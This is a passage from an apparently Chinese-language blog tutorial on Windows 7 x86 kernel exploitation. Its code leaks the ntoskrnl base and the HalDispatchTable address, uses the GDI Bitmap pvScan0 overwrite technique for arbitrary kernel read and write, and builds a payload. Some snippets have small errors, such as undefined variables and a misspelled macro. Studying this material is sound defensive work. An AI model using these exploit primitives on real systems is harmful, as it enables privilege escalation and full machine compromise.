 <span class="n">SystemNotImplemented7</span><span class="p">,</span> <span class="c1">// 29 Y N</span>
 <span class="n">SystemNotImplemented8</span><span class="p">,</span> <span class="c1">// 30 Y N</span>
 <span class="n">SystemNotImplemented9</span><span class="p">,</span> <span class="c1">// 31 Y N</span>
 <span class="n">SystemCrashDumpInformation</span><span class="p">,</span> <span class="c1">// 32 Y N</span>
 <span class="n">SystemExceptionInformation</span><span class="p">,</span> <span class="c1">// 33 Y N</span>
 <span class="n">SystemCrashDumpStateInformation</span><span class="p">,</span> <span class="c1">// 34 Y Y/N</span>
 <span class="n">SystemKernelDebuggerInformation</span><span class="p">,</span> <span class="c1">// 35 Y N</span>
 <span class="n">SystemContextSwitchInformation</span><span class="p">,</span> <span class="c1">// 36 Y N</span>
 <span class="n">SystemRegistryQuotaInformation</span><span class="p">,</span> <span class="c1">// 37 Y Y</span>
 <span class="n">SystemLoadAndCallImage</span><span class="p">,</span> <span class="c1">// 38 N Y</span>
 <span class="n">SystemPrioritySeparation</span><span class="p">,</span> <span class="c1">// 39 N Y</span>
 <span class="n">SystemNotImplemented10</span><span class="p">,</span> <span class="c1">// 40 Y N</span>
 <span class="n">SystemNotImplemented11</span><span class="p">,</span> <span class="c1">// 41 Y N</span>
 <span class="n">SystemInvalidInfoClass2</span><span class="p">,</span> <span class="c1">// 42</span>
 <span class="n">SystemInvalidInfoClass3</span><span class="p">,</span> <span class="c1">// 43</span>
 <span class="n">SystemTimeZoneInformation</span><span class="p">,</span> <span class="c1">// 44 Y N</span>
 <span class="n">SystemLookasideInformation</span><span class="p">,</span> <span class="c1">// 45 Y N</span>
 <span class="n">SystemSetTimeSlipEvent</span><span class="p">,</span> <span class="c1">// 46 N Y</span>
 <span class="n">SystemCreateSession</span><span class="p">,</span> <span class="c1">// 47 N Y</span>
 <span class="n">SystemDeleteSession</span><span class="p">,</span> <span class="c1">// 48 N Y</span>
 <span class="n">SystemInvalidInfoClass4</span><span class="p">,</span> <span class="c1">// 49</span>
 <span class="n">SystemRangeStartInformation</span><span class="p">,</span> <span class="c1">// 50 Y N</span>
 <span class="n">SystemVerifierInformation</span><span class="p">,</span> <span class="c1">// 51 Y Y</span>
 <span class="n">SystemAddVerifier</span><span class="p">,</span> <span class="c1">// 52 N Y</span>
 <span class="n">SystemSessionProcessesInformation</span> <span class="c1">// 53 Y N</span>
<span class="p">}</span><span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">;</span>
</code></pre></div></div>

<p>这里使用<code class="language-plaintext highlighter-rouge">SystemModuleInformation 11</code> 来获取所有内核模块的信息, 函数将返回一个结构体数组的简单包装.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_SYSTEM_MODULE_INFORMATION</span>
<span class="p">{</span>
    <span class="n">ULONG</span> <span class="n">Count</span><span class="p">;</span>
    <span class="n">SYSTEM_MODULE_ENTRY</span> <span class="n">Module</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span> <span class="n">SYSTEM_MODULE_INFORMATION</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">SYSTEM_MODULE_ENTRY</code> 为模块信息结构体.</p>

<p>模块信息结构体的定义如下:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_SYSTEM_MODULE_ENTRY</span>
<span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">Section</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">MappedBase</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">ImageBase</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">ImageSize</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">LoadOrderIndex</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">InitOrderIndex</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">LoadCount</span><span class="p">;</span>
    <span class="n">USHORT</span> <span class="n">OffsetToFileName</span><span class="p">;</span>
    <span class="n">UCHAR</span> <span class="n">FullPathName</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
<span class="p">}</span> <span class="n">SYSTEM_MODULE_ENTRY</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE_ENTRY</span><span class="p">;</span>
</code></pre></div></div>

<p>其中第一个模块默认为<code class="language-plaintext highlighter-rouge">Ntoskrnl.exe</code></p>

<p>获取基址及名字的代码:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">using</span> <span class="n">pZwQuerySystemInformation</span> <span class="o">=</span> <span class="n">NTSTATUS</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="p">)(</span>
  <span class="n">SYSTEM_INFORMATION_CLASS</span> <span class="n">SystemInformationClass</span><span class="p">,</span>
  <span class="n">PVOID</span>                    <span class="n">SystemInformation</span><span class="p">,</span>
  <span class="n">ULONG</span>                    <span class="n">SystemInformationLength</span><span class="p">,</span>
  <span class="n">PULONG</span>                   <span class="n">ReturnLength</span>
<span class="p">);</span> <span class="c1">// 函数指针类型定义</span>
<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="nf">GetNtoskrnl</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hNtdll</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">auto</span> <span class="n">ZwQuerySystemInformation</span> <span class="o">=</span> <span class="p">(</span><span class="n">pZwQuerySystemInformation</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">,</span> <span class="s">"ZwQuerySystemInformation"</span><span class="p">);</span> <span class="c1">//获取未导出api</span>
	<span class="n">SIZE_T</span> <span class="n">SysModLen</span><span class="p">;</span>
	<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">SysModuleInfo</span><span class="p">;</span>
	<span class="n">ZwQuerySystemInformation</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">SysModLen</span><span class="p">);</span> <span class="c1">// 先获取所有模块信息的大小.</span>
	<span class="n">SysModuleInfo</span> <span class="o">=</span> <span class="p">(</span><span class="n">decltype</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">))</span><span class="n">malloc</span><span class="p">(</span><span class="n">SysModLen</span><span class="p">);</span>          <span class="c1">// 分配空间存放结构体数组</span>
	<span class="n">ZwQuerySystemInformation</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="n">SysModuleInfo</span><span class="p">,</span> <span class="n">SysModLen</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">SysModLen</span><span class="p">);</span> <span class="c1">// 填充结构体数组</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">GetLastError</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"ZwQuerySystemInformation Function Fail..."</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">SysModuleInfo</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">LPCSTR</span> <span class="kr">inline</span> <span class="nf">GetNtoskrnlName</span><span class="p">(</span><span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">sysinfo</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// 返回的FullPathName一般类似System32\system\ntoskrnl.exe</span>
	<span class="n">LPCSTR</span> <span class="n">NtoskrnlName</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">sysinfo</span><span class="o">-&gt;</span><span class="n">Module</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">FullPathName</span><span class="p">,</span><span class="sc">'\\'</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// 截取Ntoskrnl真实名称</span>
	<span class="k">return</span> <span class="n">NtoskrnlName</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">PVOID</span> <span class="kr">inline</span> <span class="nf">GetNtoskrnlBase</span><span class="p">(</span><span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">sysinfo</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="n">sysinfo</span><span class="o">-&gt;</span><span class="n">Module</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">ImageBase</span><span class="p">;</span> <span class="c1">// 获取模块基址</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="枚举驱动信息获取基址">枚举驱动信息获取基址</h3>

<p>需要预先知道正确的<code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code> 名称</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span><span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span><span class="cpf">&lt;Psapi.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">LPVOID</span> <span class="n">imagebase</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
    <span class="n">LPDWORD</span> <span class="n">Needed</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">TCHAR</span> <span class="n">imagename</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>

    <span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="n">imagebase</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="k">sizeof</span><span class="p">(</span><span class="n">imagebase</span><span class="p">),</span> <span class="n">Needed</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">GetDeviceDriverBaseNameA</span><span class="p">(</span><span class="n">imagebase</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="p">(</span><span class="n">LPSTR</span><span class="p">)</span><span class="n">imagename</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="n">LPSTR</span><span class="p">)</span><span class="n">imagename</span><span class="p">,</span> <span class="s">"ntoskrnl.exe"</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Imagename is %s,Imagebase is 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">imagename</span><span class="p">,</span> <span class="n">imagebase</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>名称与处理器核数和是否支持<code class="language-plaintext highlighter-rouge">PAE</code>机制有关</p>

<p>关系如下:</p>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>单处理器</th>
      <th>多处理器</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>支持PAE</td>
      <td>ntkrnlpa.exe</td>
      <td>ntkrpamp.exe</td>
    </tr>
    <tr>
      <td>不支持PAE</td>
      <td>ntoskrnl.exe</td>
      <td>ntkrnlmp.exe</td>
    </tr>
  </tbody>
</table>

<h3 id="泄露haldispatchtable">泄露HalDispatchTable</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">SysModuleInfo</span> <span class="o">=</span> <span class="n">GetNtoskrnl</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">);</span>
	<span class="n">PVOID</span> <span class="n">NtoskrnlBase</span> <span class="o">=</span> <span class="n">GetNtoskrnlBase</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">);</span>
	<span class="n">LPCSTR</span> <span class="n">NtoskrnlName</span> <span class="o">=</span> <span class="n">GetNtoskrnlName</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">);</span>
	<span class="n">HMODULE</span> <span class="n">hNtoskrnl</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="n">NtoskrnlName</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">hNtoskrnl</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hNtoskrnl</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"cannot load Ntoskrnl.exe..."</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">free</span><span class="p">(</span><span class="n">SysModuleInfo</span><span class="p">);</span>
	<span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtoskrnl</span><span class="p">,</span> <span class="s">"HalDispatchTable"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">GetLastError</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"Cannot find HalDispatchTable..."</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">hNtoskrnl</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">NtoskrnlBase</span><span class="p">);</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] HalDispatchTable: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">HalDispatchTable</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
</code></pre></div></div>

<p><img src="/imgs/exploit_point.png" alt="exploit_point.png" /></p>

<p>注意到在代码中覆盖字节数不可控, 如果直接覆盖<code class="language-plaintext highlighter-rouge">HalDispatchTable</code>容易导致程序崩溃</p>

<p>故采用其他方法来控制.</p>

<h3 id="覆盖bitmap对象实现任意地址读写">覆盖Bitmap对象实现任意地址读写</h3>

<p><code class="language-plaintext highlighter-rouge">Bitmap</code>的底层内核对象<code class="language-plaintext highlighter-rouge">SURFACE</code> 部分结构: (x86)</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_SURFACE</span> <span class="p">{</span>
		<span class="n">BASEOBJECT</span> <span class="n">BaseObject</span><span class="p">;</span> <span class="c1">// 0x000</span>
		<span class="n">SURFOBJ</span> <span class="n">surfobj</span><span class="p">;</span>       <span class="c1">// 0x010</span>
		<span class="n">XDCOBJ</span> <span class="o">*</span> <span class="n">pdcoAA</span><span class="p">;</span>       <span class="c1">// 0x044</span>
		<span class="n">FLONG</span> <span class="n">flags</span><span class="p">;</span>           <span class="c1">// 0x048</span>
		<span class="p">[...]</span>
<span class="p">}</span><span class="n">SURFACE</span><span class="p">,</span> <span class="o">*</span><span class="n">PSURFACE</span><span class="p">;</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_SURFOBJ</span><span class="p">{</span>
		<span class="p">[...]</span>
		<span class="n">PVOID</span> <span class="n">pvScan0</span><span class="p">;</span>         <span class="c1">// 0x020</span>
		<span class="n">LONG</span> <span class="n">lDelta</span><span class="p">;</span>           <span class="c1">// 0x024</span>
		<span class="n">ULONG</span> <span class="n">iUniq</span><span class="p">;</span>           <span class="c1">// 0x028</span>
		<span class="n">ULONG</span> <span class="n">iBitmapFormat</span><span class="p">;</span>    <span class="c1">// 0x02c</span>
		<span class="n">USHORT</span> <span class="n">iType</span><span class="p">;</span>          <span class="c1">// 0x030</span>
		<span class="n">USHORT</span> <span class="n">fjBitmap</span><span class="p">;</span>       <span class="c1">// 0x032</span>
	<span class="c1">// size                     0x034</span>
<span class="p">}</span><span class="n">SURFOBJ</span><span class="p">,</span> <span class="o">*</span><span class="n">PSURFOBJ</span><span class="p">;</span>
<span class="c1">// 具体意义可以查阅ReactOS源码</span>
</code></pre></div></div>

<p>主要关注<code class="language-plaintext highlighter-rouge">_SURFACE</code>中的<code class="language-plaintext highlighter-rouge">pvScan0</code>成员, 它指向<code class="language-plaintext highlighter-rouge">Bitmap</code>内容的内核地址.</p>

<p>而<code class="language-plaintext highlighter-rouge">GetBitmapBits</code>和<code class="language-plaintext highlighter-rouge">SetBitmapBits</code>两个<code class="language-plaintext highlighter-rouge">api</code>会根据<code class="language-plaintext highlighter-rouge">pvScan0</code>的值对<code class="language-plaintext highlighter-rouge">Bitmap</code>的内容进行字节级别的读写.</p>

<p>故只要能覆盖<code class="language-plaintext highlighter-rouge">pvScan0</code>的值, 就能实现可控的任意地址读写.</p>

<p>在实际利用中,往往需要多次任意地址读写, 所以我们通过<code class="language-plaintext highlighter-rouge">CreateBitmap</code> 创建两个<code class="language-plaintext highlighter-rouge">Bitmap</code> ,将其中一个<code class="language-plaintext highlighter-rouge">Bitmap</code> 的<code class="language-plaintext highlighter-rouge">pvScan0</code> 成员修改为另一<code class="language-plaintext highlighter-rouge">Bitmap</code> 的<code class="language-plaintext highlighter-rouge">pvScan0</code> 成员的地址,这样通过如下代码, 就可以多次任意读写:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">VOID</span> <span class="nf">ReadOOB</span><span class="p">(</span><span class="n">HBITMAP</span> <span class="n">hManager</span><span class="p">,</span><span class="n">HBITMAP</span> <span class="n">hWorker</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">writeAddr</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">readValue</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span><span class="n">len</span><span class="p">,</span><span class="o">&amp;</span><span class="n">writeAddr</span><span class="p">);</span>
  <span class="n">GetBitmapBits</span><span class="p">(</span><span class="n">hWorker</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">readValue</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">VOID</span> <span class="nf">WriteOOB</span><span class="p">(</span><span class="n">HBITMAP</span> <span class="n">hManager</span><span class="p">,</span> <span class="n">HBITMAP</span> <span class="n">hWorker</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">writeAddr</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">writeValue</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">writeAddr</span><span class="p">);</span>
  <span class="n">SetBitmapBits</span><span class="p">(</span><span class="n">hWorker</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">writeValue</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>这样的利用手法要求我们需要知道<strong>_SURFACE</strong>的<strong>内核地址</strong></p>

<p>我们先创建<code class="language-plaintext highlighter-rouge">Bitmap</code></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HBITMAP</span> <span class="n">hWorker</span> <span class="o">=</span> <span class="n">CreateBitmap</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
<span class="n">HBITMAP</span> <span class="n">hManager</span> <span class="o">=</span> <span class="n">CreateBitmap</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
</code></pre></div></div>

<p>根据搜索引擎</p>

<p>我们知道了在win7及以下的较低版本的Windows, <code class="language-plaintext highlighter-rouge">CreateBitmap</code> 返回的<code class="language-plaintext highlighter-rouge">HBITMAP</code> 的低两字节实际上是其在<strong>PEB</strong>结构中的名为<strong>GdiSharedHandleTable</strong>的结构体数组中的索引</p>

<p>结构体数组中的结构体定义如下:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_GdiCell</span>
<span class="p">{</span>
     <span class="n">PVOID</span> <span class="n">pKernelAddress</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">wProcessIdl</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">wCount</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">wUpper</span><span class="p">;</span>
     <span class="n">UINT16</span> <span class="n">uType</span><span class="p">;</span>
     <span class="n">PVOID</span> <span class="n">pUserAddress</span><span class="p">;</span>
<span class="p">}</span><span class="n">GdiCell</span><span class="p">,</span><span class="o">*</span><span class="n">pGdiCell</span><span class="p">;</span>
</code></pre></div></div>

<p>其中的<code class="language-plaintext highlighter-rouge">pKernelAddress</code> 成员就是<code class="language-plaintext highlighter-rouge">Bitmap</code> 对应的<code class="language-plaintext highlighter-rouge">SURFACE</code> 对象的<strong>内核地址</strong></p>

<p>代码:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;intrin.h&gt;</span><span class="cp">
</span>
<span class="n">DWORD</span> <span class="nf">GetPeb</span><span class="p">(){</span>
	<span class="n">DWORD</span> <span class="n">teb</span> <span class="o">=</span> <span class="n">__readfsdword</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span> <span class="c1">// teb 存储在fs:[0x18]</span>
	<span class="n">DWORD</span> <span class="n">peb</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">teb</span><span class="p">)</span><span class="o">+</span><span class="mh">0x30</span><span class="p">);</span> <span class="c1">// teb-&gt;ProcessEnvironmentBlock</span>
	<span class="k">return</span> <span class="n">peb</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">DWORD</span> <span class="n">GdiSharedHandleTable_offset</span> <span class="o">=</span> <span class="mh">0x094</span><span class="p">;</span> <span class="c1">// GdiSharedHandleTable在PEB结构中的偏移( win7 x86)</span>
<span class="n">DWORD</span> <span class="n">peb</span> <span class="o">=</span> <span class="n">GetPeb</span><span class="p">();</span>

<span class="c1">//获取Bitmap对应的GdiCell</span>
<span class="n">pGdiCell</span> <span class="n">GdiHandleTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">pGdiCell</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)((</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="n">peb</span><span class="o">+</span><span class="n">GdiSharedHandleTable_offset</span><span class="p">));</span>
<span class="n">pGdiCell</span> <span class="n">work_cell</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">GdiHandleTable</span><span class="p">[(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">hWorker</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">];</span>
<span class="n">pGdiCell</span> <span class="n">manage_cell</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">GdiHandleTable</span><span class="p">[(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">hManager</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">];</span>

<span class="c1">// 获取对应SURFACE内核地址</span>
<span class="n">PVOID</span> <span class="n">worker_krnl_addr</span> <span class="o">=</span> <span class="n">work_cell</span><span class="o">-&gt;</span><span class="n">pKernelAddress</span><span class="p">;</span>
<span class="n">PVOID</span> <span class="n">manager_krnl_addr</span> <span class="o">=</span> <span class="n">manage_cell</span><span class="o">-&gt;</span><span class="n">pKernelAddress</span><span class="p">;</span>

<span class="n">DWORD</span> <span class="n">surfobj_offset</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="p">;</span> <span class="c1">// surfobj相对于SURFACE对象的偏移</span>
<span class="n">DWORD</span> <span class="n">pvscan0_offset</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span>  <span class="c1">// pvScan0相对于SURFOBJ对象的偏移</span>

<span class="c1">// 获取相应的pvScan0的地址</span>
<span class="n">DWORD</span> <span class="n">w_pvscan0</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">worker_krnl_addr</span> <span class="o">+</span> <span class="n">surfobj_offset</span> <span class="o">+</span> <span class="n">pvscan0_offset</span><span class="p">;</span>
<span class="n">DWORD</span> <span class="n">m_pvscan0</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">manager_krnl_addr</span> <span class="o">+</span> <span class="n">surfobj_offset</span> <span class="o">+</span> <span class="n">pvscan0_offset</span><span class="p">;</span>
</code></pre></div></div>

<p>因为在覆盖<code class="language-plaintext highlighter-rouge">pvScan0</code> 时还会覆盖其他数据, 其中有部分数据是<code class="language-plaintext highlighter-rouge">SetBitmapBits</code> 和<code class="language-plaintext highlighter-rouge">GetBitmapBits</code> 运行所需, 所以要在payload中填充修复, 重要成员可以通过分析<code class="language-plaintext highlighter-rouge">bDoGetSetBitmapBits</code> 来获得.</p>

<p>这里直接给出需要修复的成员</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define API_BITMAP 0x04000000
#define SHAREACCESS_SURFACE 0x00000200
#define DDB_SURFACE 0x00800000
#define STYPE_BITMAP 0L
#define BMF_TOPDOWN 0x1
#define BMF_32BPP 0x6
</span>
<span class="n">surfobj</span><span class="p">.</span><span class="n">lDelta</span> <span class="o">=</span> <span class="mh">0x180</span><span class="p">;</span>
<span class="n">surfobj</span><span class="p">.</span><span class="n">iBitmapFormat</span> <span class="o">=</span> <span class="n">BMF_32BPP</span><span class="p">;</span>
<span class="n">surfobj</span><span class="p">.</span><span class="n">iType</span> <span class="o">=</span> <span class="n">STYPE_BITMAP</span><span class="p">;</span>
<span class="n">surfobj</span><span class="p">.</span><span class="n">fjBitmap</span> <span class="o">=</span> <span class="n">BMF_TOPDOWN</span><span class="p">;</span>
<span class="n">surface</span><span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="n">API_BITMAP</span> <span class="o">|</span> <span class="n">SHAREACCEAA_SURFACE</span> <span class="o">|</span> <span class="n">DDB_SURFACE</span><span class="p">;</span>
</code></pre></div></div>

<p>构造payload</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="mi">512</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">w_pvscan0</span><span class="p">;</span>           <span class="c1">// pvScan0 : Worker pvScan0</span>
<span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x180</span><span class="p">;</span>               <span class="c1">// lDelta : 0x180</span>
<span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xabcd</span><span class="p">;</span>              <span class="c1">// iUniq : 0xabcd</span>
<span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">BMF_32BPP</span><span class="p">;</span>           <span class="c1">// iBitmapFormat : BMF_32BPP</span>
<span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">STYPE_BITMAP</span><span class="p">;</span>        <span class="c1">// iType : STYPE_BITMAP</span>
<span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">|=</span> <span class="n">BMF_TOPDOWN</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">;</span>  <span class="c1">// fjBitmap : BMF_TOPDOWN</span>
<span class="n">p</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4800200</span><span class="p">;</span>           <span class="c1">// flags : API_BITMAP | SHAREACCESS_SURFACE | DDB_SURFACE</span>

<span class="n">PDWORD</span> <span class="n">tmp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="n">tmp</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="n">m_pvscan0</span><span class="p">;</span>   <span class="c1">// arbitrary write addr : Manager pvScan0</span>
